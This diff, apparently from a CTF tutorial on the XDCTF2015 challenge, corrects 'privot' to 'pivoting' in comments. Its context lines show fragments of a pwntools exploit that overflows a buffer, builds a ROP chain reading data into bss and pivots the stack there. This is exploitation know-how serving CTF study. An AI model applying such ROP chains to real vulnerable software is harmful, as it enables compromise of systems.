@@ -131,7 +131,7 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-## stack privot to bss segment
+## stack pivoting to bss segment
 ## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
@@ -139,7 +139,7 @@ base_stage = bss_addr + stack_size
 rop.raw('a' * offset)
 ### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-### stack privot, set esp = base_stage
+### stack pivoting, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
@@ -187,7 +187,7 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-## stack privot to bss segment
+## stack pivoting to bss segment
 ## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
@@ -195,7 +195,7 @@ base_stage = bss_addr + stack_size
 rop.raw('a' * offset)
 ### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-### stack privot, set esp = base_stage
+### stack pivoting, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
@@ -275,7 +275,7 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-## stack privot to bss segment
+## stack pivoting to bss segment
 ## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
@@ -283,7 +283,7 @@ base_stage = bss_addr + stack_size
 rop.raw('a' * offset)
 ### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-### stack privot, set esp = base_stage
+### stack pivoting, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
@@ -366,7 +366,7 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-## stack privot to bss segment
+## stack pivoting to bss segment
 ## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
@@ -374,7 +374,7 @@ base_stage = bss_addr + stack_size
 rop.raw('a' * offset)
 ### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-### stack privot, set esp = base_stage
+### stack pivoting, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
@@ -454,7 +454,7 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-## stack privot to bss segment
+## stack pivoting to bss segment
 ## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
@@ -462,7 +462,7 @@ base_stage = bss_addr + stack_size
 rop.raw('a' * offset)
 ### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-### stack privot, set esp = base_stage
+### stack pivoting, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
@@ -544,7 +544,7 @@ bss_addr = elf.bss()
 
 r.recvuntil('Welcome to XDCTF2015~!\n')
 
-## stack privot to bss segment
+## stack pivoting to bss segment
 ## new stack size is 0x800
 stack_size = 0x800
 base_stage = bss_addr + stack_size
@@ -552,7 +552,7 @@ base_stage = bss_addr + stack_size
 rop.raw('a' * offset)
 ### read 100 byte to base_stage
 rop.read(0, base_stage, 100)
-### stack privot, set esp = base_stage
+### stack pivoting, set esp = base_stage
 rop.migrate(base_stage)
 r.sendline(rop.chain())
 
